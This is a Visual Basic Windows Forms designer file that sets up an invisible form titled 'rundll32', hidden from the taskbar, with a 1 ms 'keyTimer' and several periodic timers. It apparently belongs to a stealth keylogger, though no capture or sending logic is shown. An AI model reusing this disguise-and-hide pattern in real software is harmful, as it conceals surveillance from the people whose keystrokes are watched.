<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing AndAlso components IsNot Nothing Then
            components.Dispose()
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Me.keyTimer = New System.Windows.Forms.Timer(Me.components)
        Me.action = New System.Windows.Forms.Timer(Me.components)
        Me.startDelay = New System.Windows.Forms.Timer(Me.components)
        Me.execute = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'keyTimer
        '
        Me.keyTimer.Enabled = True
        Me.keyTimer.Interval = 1
        '
        'action
        '
        Me.action.Enabled = True
        Me.action.Interval = 300000
        '
        'startDelay
        '
        Me.startDelay.Enabled = True
        Me.startDelay.Interval = 2000
        '
        'execute
        '
        Me.execute.Enabled = True
        Me.execute.Interval = 600000
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(174, 0)
        Me.Name = "Form1"
        Me.Opacity = 0
        Me.ShowInTaskbar = False
        Me.Text = "rundll32"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents keyTimer As System.Windows.Forms.Timer
    Friend WithEvents action As System.Windows.Forms.Timer
    Friend WithEvents startDelay As System.Windows.Forms.Timer
    Friend WithEvents execute As System.Windows.Forms.Timer

End Class
